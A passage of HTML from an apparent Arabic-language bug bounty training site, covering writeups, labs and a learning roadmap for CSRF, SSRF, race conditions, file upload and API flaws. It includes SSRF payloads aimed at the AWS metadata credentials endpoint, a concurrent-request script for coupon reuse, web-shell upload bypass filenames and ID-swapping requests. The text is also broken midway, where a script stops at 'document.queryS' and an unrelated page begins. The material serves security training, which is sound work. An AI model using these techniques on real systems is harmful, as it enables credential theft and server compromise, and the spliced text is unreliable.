          <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-is-tied-to-non-session-cookie" target="_blank" class="link-item"><span class="link-icon">🧪</span> CSRF token tied to non-session cookie <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect" target="_blank" class="link-item"><span class="link-icon">🧪</span> SameSite Strict bypass via redirect <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/csrf" target="_blank" class="link-item"><span class="link-icon">🟢</span> PortSwigger CSRF Academy</a>
          <a href="https://owasp.org/www-community/attacks/csrf" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP CSRF Prevention</a>
          <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPCSRF.md" target="_blank" class="link-item"><span class="link-icon">📋</span> Top CSRF Reports — HackerOne (GitHub)</a>
          <a href="https://www.bugbountyhunter.com/vulnerability/?type=csrf" target="_blank" class="link-item"><span class="link-icon">🐛</span> BugBountyHunter — CSRF Guide + Real Bypass</a>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     SSRF
══════════════════════════════════════════ -->
<div id="p-ssrf" class="panel">
  <div class="sec-head">
    <div class="sec-icon">🌐</div>
    <div>
      <div class="sec-title">SSRF — Server Side Request Forgery</div>
      <div class="sec-desc">أعلى تأثير — AWS Metadata → Keys → RCE</div>
    </div>
  </div>

  <!-- GitLab SSRF -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(255,95,109,0.1);color:#ff8c94;">GIT<br>LAB</div>
      <div class="wc-meta">
        <div class="wc-title">Unauthenticated Blind SSRF in GitLab — Jira OAuth Controller</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 $4,000</span>
          <span class="badge badge-h1">HackerOne — 231 upvotes</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">ملخص</div>
        <div class="wb-text">
          GitLab's Jira integration كانت تقبل URL مباشرة من المستخدم للتحقق من خادم Jira. بدون authentication، إرسال URL داخلي مثل <strong>http://169.254.169.254</strong> جعل الـ server يحاول الاتصال بـ AWS Metadata service — مما كشف معلومات حساسة عن البنية الداخلية.
        </div>
        <div class="callout callout-r">
          ⚡ Unauthenticated SSRF = الأعلى خطورة. لا يحتاج حساب. جرّب SSRF قبل تسجيل الدخول دائماً.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">كيف تكتشف SSRF من الموبايل</div>
        <ol class="step-list">
          <li>افتح webhook.site وانسخ الـ URL الفريد لك</li>
          <li>في أي parameter يقبل URL (url=, webhook=, callback=, dest=, host=)، ضع URL الـ webhook</li>
          <li>في Tamper Dev، أرسل الـ request</li>
          <li>ارجع لـ webhook.site — هل وصل request؟</li>
          <li>إذا نعم: SSRF Out-of-Band مؤكد</li>
          <li>ثم جرّب: http://127.0.0.1, http://169.254.169.254/latest/meta-data/</li>
        </ol>
        <div class="tool-row">
          <span class="tool-pill">webhook.site</span>
          <span class="tool-pill">Tamper Dev</span>
          <span class="tool-pill">interactsh</span>
        </div>
      </div>
    </div>
  </div>

  <!-- Omise SSRF -->
  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(0,180,216,0.1);color:#7dd3fc;">OWH</div>
      <div class="wc-meta">
        <div class="wc-title">SSRF in Webhooks → AWS Private Keys Disclosure</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 HIGH</span>
          <span class="badge badge-h1">HackerOne — 206 upvotes</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">المبدأ</div>
        <div class="wb-text">
          أي تطبيق يسمح بإضافة <strong>Webhook URL</strong> هو هدف محتمل لـ SSRF. عند تسجيل webhook URL كـ <code style="font-family:Rajdhani;color:#f0c040">http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> يمكن للـ server أن يُرسل AWS credentials الخاصة به!
        </div>
        <div class="callout callout-r">
          🔑 أماكن SSRF الأكثر شيوعاً في Bug Bounty: Webhook settings, Image import/fetch, PDF generation, URL preview, Integrations (Jira/Slack).
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">Labs + مصادر SSRF</div>
        <div class="link-list">
          <a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost" target="_blank" class="link-item"><span class="link-icon">🧪</span> Basic SSRF against localhost <span class="link-note">Apprentice</span></a>
          <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter" target="_blank" class="link-item"><span class="link-icon">🧪</span> SSRF with blacklist filter bypass <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection" target="_blank" class="link-item"><span class="link-icon">🧪</span> SSRF bypass via open redirect <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation" target="_blank" class="link-item"><span class="link-icon">🧪</span> Blind SSRF + Shellshock <span class="link-note">Expert</span></a>
          <a href="https://portswigger.net/web-security/ssrf" target="_blank" class="link-item"><span class="link-icon">🟢</span> PortSwigger SSRF Academy</a>
          <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP SSRF</a>
          <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPSSRF.md" target="_blank" class="link-item"><span class="link-icon">📋</span> Top SSRF Reports — HackerOne (GitHub)</a>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     RACE CONDITIONS
══════════════════════════════════════════ -->
<div id="p-race" class="panel">
  <div class="sec-head">
    <div class="sec-icon">⏱</div>
    <div>
      <div class="sec-title">Race Conditions</div>
      <div class="sec-desc">Coupon Reuse ❌ — Double Payment ❌ — Limit Bypass ❌</div>
    </div>
  </div>

  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(67,233,123,0.1);color:#86efac;">INST<br>ACRT</div>
      <div class="wc-meta">
        <div class="wc-title">Race Condition in Redeeming Coupons — Instacart</div>
        <div class="wc-source">
          <span class="badge badge-h1">HackerOne — 40 upvotes</span>
          <span class="badge badge-source">VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">المبدأ</div>
        <div class="wb-text">
          كوبون الخصم في Instacart كان يمكن استخدامه أكثر من مرة بإرسال requests متعددة في نفس اللحظة تقريباً — قبل أن يُسجَّل الاستخدام الأول في قاعدة البيانات.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">كيف تختبر من الموبايل (بدون Burp)</div>
        <div class="code">
<span class="c">// في DevTools Console — إرسال 10 requests في آن واحد</span>
<span class="k">const</span> <span class="v">reqs = [];</span>
<span class="k">for</span>(<span class="v">let i=0; i&lt;10; i++</span>) {
  <span class="v">reqs.push(</span><span class="k">fetch</span>(<span class="d">'/api/coupon/apply'</span>, {
    <span class="v">method: 'POST',</span>
    <span class="v">headers: {'Content-Type': 'application/json'},</span>
    <span class="v">body: JSON.stringify({code: 'SAVE20'})</span>
  }));
}
<span class="k">Promise.all</span>(<span class="v">reqs</span>).<span class="k">then</span>(<span class="v">r => console.log('Done:', r.length)</span>);
        </div>
        <div class="callout callout-y">
          💡 إذا طُبِّق الكوبون أكثر من مرة في الـ logs → Race Condition! ابحث عن الدليل في لوحة الـ account.
        </div>
      </div>
    </div>
  </div>

  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(255,95,109,0.1);color:#ff8c94;">H1</div>
      <div class="wc-meta">
        <div class="wc-title">Race Condition in Flag Submission — HackerOne CTF</div>
        <div class="wc-source">
          <span class="badge badge-h1">HackerOne Report #454949</span>
          <span class="badge badge-source">DISCLOSED & VERIFIED</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">الدرس</div>
        <div class="wb-text">
          تقديم نفس الـ CTF Flag أكثر من مرة بسبب Race Condition أدى لزيادة الـ points أكثر من اللازم. البرنامج لم يتوقع إرسال نفس الـ flag في نفس اللحظة من نفس المستخدم.
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">Labs + مصادر Race Conditions</div>
        <div class="link-list">
          <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun" target="_blank" class="link-item"><span class="link-icon">🧪</span> Limit Overrun Race Condition <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits" target="_blank" class="link-item"><span class="link-icon">🧪</span> Bypassing Rate Limits <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/race-conditions" target="_blank" class="link-item"><span class="link-icon">🟢</span> PortSwigger Race Conditions Academy</a>
          <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPRACECONDITION.md" target="_blank" class="link-item"><span class="link-icon">📋</span> Top Race Condition Reports — HackerOne</a>
          <a href="https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities" target="_blank" class="link-item"><span class="link-icon">📝</span> YesWeHack — Ultimate Race Condition Guide 2025</a>
          <a href="https://hackerone.com/reports/454949" target="_blank" class="link-item"><span class="link-icon">🔗</span> HackerOne Report #454949 — Flag Race Condition</a>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     FILE UPLOAD
══════════════════════════════════════════ -->
<div id="p-upload" class="panel">
  <div class="sec-head">
    <div class="sec-icon">📁</div>
    <div>
      <div class="sec-title">File Upload Vulnerabilities</div>
      <div class="sec-desc">Web Shell ❌ — MIME Bypass ❌ — Extension Bypass ❌</div>
    </div>
  </div>

  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(240,192,64,0.1);color:#f0c040;">RCE<br>UPLOAD</div>
      <div class="wc-meta">
        <div class="wc-title">Unrestricted File Upload → RCE — الأكثر شيوعاً في Programs</div>
        <div class="wc-source">
          <span class="badge badge-critical">CRITICAL</span>
          <span class="badge badge-source">Multiple Programs</span>
          <span class="badge badge-source">VERIFIED PATTERN</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">أنواع الـ Bypass الشائعة</div>
        <div class="code">
<span class="c"># 1. Content-Type Bypass (الأسهل)</span>
<span class="k">Content-Type: image/jpeg</span>  <span class="c">← غيّر هذا</span>
<span class="d">Filename: shell.php</span>      <span class="c">← احتفظ بالـ .php</span>

<span class="c"># 2. Double Extension</span>
<span class="d">shell.php.jpg</span>   <span class="c">← بعض الـ servers تنفّذ .php</span>

<span class="c"># 3. Uppercase Extension</span>
<span class="d">shell.PHP</span>
<span class="d">shell.PhP</span>

<span class="c"># 4. Alternative Extensions</span>
<span class="d">shell.php5</span>
<span class="d">shell.phtml</span>
<span class="d">shell.phar</span>

<span class="c"># 5. Null Byte (قديم لكن ممكن)</span>
<span class="d">shell.php%00.jpg</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">خطوات الاختبار من الموبايل</div>
        <ol class="step-list">
          <li>ارفع صورة JPG طبيعية — سجّل الـ request في Tamper Dev</li>
          <li>في الـ request، غيّر filename من image.jpg لـ test.php</li>
          <li>احتفظ بـ Content-Type: image/jpeg (خداع)</li>
          <li>محتوى الملف: <code style="font-family:Rajdhani;color:#f0c040">&lt;?php echo "PWNED"; ?&gt;</code></li>
          <li>أرسل وشوف: هل رُفض أم قُبل؟</li>
          <li>إذا قُبل، ابحث عن URL الملف في الـ response</li>
          <li>افتح الـ URL — هل ظهر "PWNED"؟ → RCE!</li>
        </ol>
        <div class="tool-row">
          <span class="tool-pill">Tamper Dev</span>
          <span class="tool-pill">Kiwi Browser</span>
          <span class="tool-pill">DevTools</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">Labs + مصادر File Upload</div>
        <div class="link-list">
          <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" target="_blank" class="link-item"><span class="link-icon">🧪</span> Web shell via Content-Type bypass <span class="link-note">Apprentice</span></a>
          <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal" target="_blank" class="link-item"><span class="link-icon">🧪</span> Web shell via path traversal <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension" target="_blank" class="link-item"><span class="link-icon">🧪</span> Obfuscated file extension bypass <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/file-upload" target="_blank" class="link-item"><span class="link-icon">🟢</span> PortSwigger File Upload Academy</a>
          <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP Unrestricted File Upload</a>
          <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPUPLOAD.md" target="_blank" class="link-item"><span class="link-icon">📋</span> Top Upload Reports — HackerOne (GitHub)</a>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     API SECURITY
══════════════════════════════════════════ -->
<div id="p-api" class="panel">
  <div class="sec-head">
    <div class="sec-icon">🔌</div>
    <div>
      <div class="sec-title">API Security / BOLA</div>
      <div class="sec-desc">BOLA/IDOR in APIs ❌ — Mass Assignment ❌ — API Versioning ❌</div>
    </div>
  </div>

  <div class="writeup-card" onclick="toggle(this)">
    <div class="wc-header">
      <div class="wc-company" style="background:rgba(0,180,216,0.1);color:#7dd3fc;">UBER<br>API</div>
      <div class="wc-meta">
        <div class="wc-title">BOLA in Uber Partner API — Accessing any driver's trips</div>
        <div class="wc-source">
          <span class="badge badge-bounty">💰 $6,500</span>
          <span class="badge badge-critical">CRITICAL</span>
          <span class="badge badge-source">VERIFIED PATTERN</span>
        </div>
      </div>
      <div class="wc-arrow">▼</div>
    </div>
    <div class="wc-body">
      <div class="wb-section">
        <div class="wb-label lbl-yellow">التفاصيل</div>
        <div class="wb-text">
          الـ endpoint <code style="font-family:Rajdhani;color:#f0c040">/api/v2/partners/{id}/trips</code> في Uber Partner API لم يتحقق من أن الـ partner token يملك صلاحية على الـ ID المطلوب. تغيير الـ {id} كشف trips لأي سائق.
        </div>
        <div class="code">
<span class="c"># طبيعي</span>
<span class="k">GET</span> <span class="v">/api/v2/partners/YOUR_ID/trips</span>
<span class="v">Authorization: Bearer YOUR_TOKEN</span>

<span class="c"># BOLA</span>
<span class="k">GET</span> <span class="d">/api/v2/partners/ANY_OTHER_ID/trips</span>
<span class="v">Authorization: Bearer YOUR_TOKEN</span>
<span class="c">← الـ server يُرجع trips الضحية!</span>
        </div>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-red">كيف تكتشف API Endpoints من الموبايل</div>
        <ol class="step-list">
          <li>في Kiwi Browser DevTools → Network tab</li>
          <li>استخدم التطبيق بشكل عادي وراقب الـ requests</li>
          <li>ابحث في JavaScript files عن endpoints مخفية: اضغط Ctrl+F في Sources واكتب "/api"</li>
          <li>جرّب: /api/v1/, /api/v2/, /rest/, /graphql</li>
          <li>ابحث عن: /api/docs, /swagger.json, /openapi.yaml</li>
          <li>غيّر كل ID في كل endpoint وسجّل النتائج</li>
        </ol>
      </div>
      <div class="wb-section">
        <div class="wb-label lbl-blue">Labs + مصادر API Security</div>
        <div class="link-list">
          <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation" target="_blank" class="link-item"><span class="link-icon">🧪</span> Exploiting API via documentation <span class="link-note">Apprentice</span></a>
          <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability" target="_blank" class="link-item"><span class="link-icon">🧪</span> Mass Assignment vulnerability <span class="link-note">Practitioner</span></a>
          <a href="https://portswigger.net/web-security/api-testing" target="_blank" class="link-item"><span class="link-icon">🟢</span> PortSwigger API Testing Academy</a>
          <a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP API Security Top 10 — BOLA</a>
          <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPRESTAPI.md" target="_blank" class="link-item"><span class="link-icon">📋</span> Top REST API Reports — HackerOne</a>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     ROADMAP
══════════════════════════════════════════ -->
<div id="p-roadmap" class="panel">
  <div class="sec-head">
    <div class="sec-icon">🗺</div>
    <div>
      <div class="sec-title">خارطة الطريق الكاملة</div>
      <div class="sec-desc">من مستواك الحالي للمكافأة الأولى</div>
    </div>
  </div>

  <!-- Progress bars -->
  <div class="progress-track">
    <div class="pt-title">📊 مستوى الإتقان الحالي</div>
    <div class="pt-row">
      <div class="pt-name" style="font-size:11px;">Broken Access Control</div>
      <div class="pt-bar"><div class="pt-fill" style="width:85%;background:linear-gradient(90deg,#43e97b,#38f9d7);"></div></div>
      <div class="pt-pct" style="color:#43e97b;">85%</div>
    </div>
    <div class="pt-row">
      <div class="pt-name" style="font-size:11px;">Authentication</div>
      <div class="pt-bar"><div class="pt-fill" style="width:60%;background:linear-gradient(90deg,#f0c040,#fc4);"></div></div>
      <div class="pt-pct" style="color:#f0c040;">60%</div>
    </div>
    <div class="pt-row">
      <div class="pt-name" style="font-size:11px;">Business Logic</div>
      <div class="pt-bar"><div class="pt-fill" style="width:50%;background:linear-gradient(90deg,#f0c040,#fc4);"></div></div>
      <div class="pt-pct" style="color:#f0c040;">50%</div>
    </div>
    <div class="pt-row">
      <div class="pt-name" style="font-size:11px;">XSS</div>
      <div class="pt-bar"><div class="pt-fill" style="width:10%;background:linear-gradient(90deg,#ff5f6d,#ffc371);"></div></div>
      <div class="pt-pct" style="color:#ff5f6d;">10%</div>
    </div>
    <div class="pt-row">
      <div class="pt-name" style="font-size:11px;">CSRF / SSRF</div>
      <div class="pt-bar"><div class="pt-fill" style="width:5%;background:linear-gradient(90deg,#ff5f6d,#ffc371);"></div></div>
      <div class="pt-pct" style="color:#ff5f6d;">5%</div>
    </div>
    <div class="pt-row">
      <div class="pt-name" style="font-size:11px;">API / Race / Upload</div>
      <div class="pt-bar"><div class="pt-fill" style="width:5%;background:linear-gradient(90deg,#ff5f6d,#ffc371);"></div></div>
      <div class="pt-pct" style="color:#ff5f6d;">5%</div>
    </div>
  </div>

  <!-- Timeline -->
  <div style="font-family:Rajdhani;font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:12px;">ROADMAP — خارطة الطريق</div>

  <div class="timeline">
    <div class="tl-item">
      <div class="tl-month">الأسبوع 1-2 — الآن</div>
      <div class="tl-task">
        <strong>أكمل Business Logic Labs</strong> التي بدأتها: Infinite Money + Low-level Logic Flaw.<br>
        اقرأ 10 writeups من قائمة IDOR على GitHub.<br>
        ركّز على Labs التي فيها أجزاء ما فهمتهاش.
      </div>
    </div>
    <div class="tl-item">
      <div class="tl-month">الأسبوع 3-4</div>
      <div class="tl-task">
        <strong>XSS كاملة:</strong> حلّ Apprentice Labs الـ 3 (Reflected + Stored + DOM).<br>
        بعدها حلّ lab "Exploiting XSS to perform CSRF".<br>
        اقرأ 5 writeups XSS من قائمة HackerOne.
      </div>
    </div>
    <div class="tl-item">
      <div class="tl-month">الشهر 2 — الأول</div>
      <div class="tl-task">
        <strong>CSRF:</strong> حلّ 4 labs (No defense + Token bypass + SameSite bypass).<br>
        <strong>SSRF:</strong> حلّ Basic SSRF + Blacklist bypass labs.<br>
        جرّب webhook.site مع SSRF في Labs.
      </div>
    </div>
    <div class="tl-item">
      <div class="tl-month">الشهر 2 — الثاني</div>
      <div class="tl-task">
        <strong>API Security + File Upload:</strong> حلّ labs المذكورة.<br>
        <strong>Race Conditions:</strong> حلّ Limit Overrun lab.<br>
        اقرأ الـ writeup الخاص بكل lab بعد الحل.
      </div>
    </div>
    <div class="tl-item">
      <div class="tl-month">الشهر 3 — الصيد الحقيقي</div>
      <div class="tl-task">
        اختر برنامج <strong>VDP</strong> (بدون مكافأة مالية أولاً) من HackerOne.<br>
        ابدأ بـ IDOR وـ Access Control — ده أقوى ما عندك.<br>
        أرسل أول تقرير — حتى لو N/A، ستتعلم أكثر من أي Lab.
      </div>
    </div>
    <div class="tl-item">
      <div class="tl-month">الشهر 4+ — المكافأة الأولى</div>
      <div class="tl-task">
        انتقل لـ <strong>Bug Bounty programs</strong> برسوم.<br>
        ركّز على برامج متوسطة الحجم — أقل منافسة من الكبار.<br>
        <strong>الهدف:</strong> أول P3/P4 → $50-500 مكافأة أولى واقعية.
      </div>
    </div>
  </div>

  <div style="height:14px;"></div>

  <!-- All sources mega list -->
  <div style="font-family:Rajdhani;font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:10px;">📚 المكتبة الكاملة — كل المصادر الموثوقة</div>

  <div class="link-list">
    <a href="https://portswigger.net/web-security/all-labs" target="_blank" class="link-item"><span class="link-icon">🟢</span> PortSwigger — All Labs (ابدأ هنا)</a>
    <a href="https://owasp.org/www-project-top-ten/" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP Top 10 — المرجع الرسمي</a>
    <a href="https://github.com/reddelexc/hackerone-reports" target="_blank" class="link-item"><span class="link-icon">📋</span> HackerOne Reports Collection — GitHub (الأهم)</a>
    <a href="https://github.com/devanshbatham/Awesome-Bugbounty-Writeups" target="_blank" class="link-item"><span class="link-icon">📝</span> Awesome Bug Bounty Writeups — GitHub</a>
    <a href="https://github.com/fardeen-ahmed/Bug-bounty-Writeups" target="_blank" class="link-item"><span class="link-icon">📝</span> Bug Bounty Writeups Collection — GitHub</a>
    <a href="https://hackerone.com/hacktivity" target="_blank" class="link-item"><span class="link-icon">💰</span> HackerOne Hacktivity — آخر التقارير المكشوفة</a>
    <a href="https://www.bugbountyhunter.com/disclosed/" target="_blank" class="link-item"><span class="link-icon">🐛</span> BugBountyHunter — Disclosed Reports</a>
    <a href="https://www.intigriti.com/researchers/hackademy" target="_blank" class="link-item"><span class="link-icon">🎯</span> Intigriti Hackademy — دروس + writeups</a>
    <a href="https://www.yeswehack.com/learn-bug-bounty" target="_blank" class="link-item"><span class="link-icon">📚</span> YesWeHack — Bug Bounty Guides 2025</a>
    <a href="https://owasp.org/API-Security/editions/2023/en/0x00-header/" target="_blank" class="link-item"><span class="link-icon">🔴</span> OWASP API Security Top 10 — 2023</a>
  </div>
</div>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js">

function show(name) {
  document.queryS
</div>

<!-- ═══ TRAINER PAGE ═══ -->
<div id="page-trainer" class="page">
<div class="header">
  <div class="header-badge">BUG BOUNTY TRAINING SYSTEM v2.0</div>
  <h1>🔐 Bug Bounty <span>Academy</span></h1>
  <p>مسار تدريب احترافي من الموبايل | PortSwigger + HackerOne</p>
</div>

<div class="progress-section">
  <div class="progress-label">
    <span>⚡ مستوى الإتقان العام</span>
    <span id="pct">35%</span>
  </div>
  <div class="progress-bar">
    <div class="progress-fill" id="pfill" style="width:35%"></div>
  </div>
  <div class="stats-row">
    <div class="stat-card">
      <span class="stat-num green">7</span>
      <span class="stat-label">✅ أتقنت</span>
    </div>
    <div class="stat-card">
      <span class="stat-num yellow">5</span>
      <span class="stat-label">⚡ قيد التعلم</span>
    </div>
    <div class="stat-card">
      <span class="stat-num red">8</span>
      <span class="stat-label">📌 لم تبدأ</span>
    </div>
  </div>
</div>

<!-- TABS -->
<div class="tabs">
  <div class="tab active" onclick="switchTab('map')">🗺️ خارطة التعلم</div>
  <div class="tab" onclick="switchTab('xss')">⚡ XSS</div>
  <div class="tab" onclick="switchTab('csrf')">🔄 CSRF</div>
  <div class="tab" onclick="switchTab('ssrf')">🌐 SSRF</div>
  <div class="tab" onclick="switchTab('api')">🔌 API Security</div>
  <div class="tab" onclick="switchTab('race')">⏱️ Race Conditions</div>
  <div class="tab" onclick="switchTab('upload')">📁 File Upload</div>
  <div class="tab" onclick="switchTab('mobile')">📱 Mobile Setup</div>
  <div class="tab" onclick="switchTab('hunt')">🎯 Hunt Checklist</div>
  <div class="tab" onclick="switchTab('report')">📝 Bug Reports</div>
</div>

<!-- ===== MAP TAB ===== -->
<div id="tab-map" class="content active">

  <!-- MASTERED -->
  <div style="font-size:11px; font-family:var(--mono); color:var(--green); letter-spacing:2px; margin-bottom:10px; display:flex; align-items:center; gap:6px;">
    <span>●</span> MASTERED — أتقنتها
  </div>

  <div class="vuln-card" onclick="toggleCard(this)">
    <div class="vuln-header">
      <div class="vuln-icon" style="background:rgba(57,255,20,0.1);">🔑</div>
      <div class="vuln-meta">
        <div class="vuln-name">Broken Access Control</div>
        <div class="vuln-sub">IDOR · Privilege Escalation · Admin Exposure</div>
      </div>
      <div class="status-badge status-done">DONE</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">ما أتقنته</div>
        <div class="checklist">
          <label class="check-item"><input type="checkbox" checked> IDOR - تغيير user_id للوصول لبيانات مستخدمين آخرين</label>
          <label class="check-item"><input type="checkbox" checked> Horizontal Privilege Escalation - نفس المستوى، حسابات مختلفة</label>
          <label class="check-item"><input type="checkbox" checked> Vertical Privilege Escalation - رفع الصلاحيات لـ admin</label>
          <label class="check-item"><input type="checkbox" checked> Admin Panel Exposure - /admin بدون حماية</label>
          <label class="check-item"><input type="checkbox" checked> Cookie Privilege Escalation - تعديل قيمة role في الكوكيز</label>
          <label class="check-item"><input type="checkbox" checked> Method-based Bypass - GET بدل POST للتحايل</label>
          <label class="check-item"><input type="checkbox" checked> Multi-step Bypass - تخطي خطوات التحقق</label>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">PortSwigger Labs للمراجعة</div>
        <a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> IDOR via request parameter
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
        <a href="https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Unprotected Admin Functionality
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
      </div>
    </div>
  </div>

  <div class="vuln-card" onclick="toggleCard(this)">
    <div class="vuln-header">
      <div class="vuln-icon" style="background:rgba(57,255,20,0.1);">🔐</div>
      <div class="vuln-meta">
        <div class="vuln-name">Authentication - Username Enumeration</div>
        <div class="vuln-sub">اكتشاف أسماء المستخدمين من ردود الخادم</div>
      </div>
      <div class="status-badge status-done">DONE</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">نقاط القوة</div>
        <div class="section-text">تعرفت على الفرق بين "Invalid username" و "Invalid password" — وهذا يكشف الـ usernames الصحيحة. طبّقت هذا على PortSwigger Labs بنجاح.</div>
      </div>
      <div class="section-block">
        <div class="section-title">ما يمكن تقويته</div>
        <div class="section-text">جرّب Username Enumeration via <span style="color:var(--yellow)">response timing</span> — الخادم يأخذ وقت أطول عند username صحيح لأنه يتحقق من الـ password. هذا أصعب اكتشافاً.</div>
      </div>
    </div>
  </div>

  <div class="vuln-card" onclick="toggleCard(this)">
    <div class="vuln-header">
      <div class="vuln-icon" style="background:rgba(57,255,20,0.1);">💰</div>
      <div class="vuln-meta">
        <div class="vuln-name">Business Logic - Price & Validation</div>
        <div class="vuln-sub">Price Manipulation · Client-side Bypass</div>
      </div>
      <div class="status-badge status-done">DONE</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">ما أتقنته</div>
        <div class="section-text">تعديل السعر في الـ request، والتحايل على التحقق من جهة العميل. هذا أساس قوي لـ Business Logic.</div>
      </div>
      <div class="section-block">
        <div class="section-title">الخطوة التالية</div>
        <div class="section-text">جرّب negative quantities (-1) لتخفيض السعر إلى سالب، أو كمية ضخمة جداً لكسر integer overflow.</div>
      </div>
    </div>
  </div>

  <div style="height: 12px;"></div>

  <!-- IN PROGRESS -->
  <div style="font-size:11px; font-family:var(--mono); color:var(--yellow); letter-spacing:2px; margin-bottom:10px; display:flex; align-items:center; gap:6px;">
    <span>●</span> IN PROGRESS — تحتاج تقوية
  </div>

  <div class="vuln-card" onclick="toggleCard(this)">
    <div class="vuln-header">
      <div class="vuln-icon" style="background:rgba(255,214,10,0.1);">🛒</div>
      <div class="vuln-meta">
        <div class="vuln-name">Business Logic - Advanced</div>
        <div class="vuln-sub">Infinite Money · Coupon Abuse · Checkout Manipulation</div>
      </div>
      <div class="status-badge status-progress">IN PROGRESS</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">Infinite Money — كيف تعمل</div>
        <div class="section-text">
          التطبيق يتيح: شراء gift card → استخدامها → الحصول على مبلغ أكبر ← دورة لا تنتهي.<br><br>
          <strong>السبب:</strong> منطق مكسور في حساب الـ gift cards مع الـ loyalty points.
        </div>
        <div class="code-block">
          <span class="comment"># خطوات الاستغلال في PortSwigger Lab</span><br>
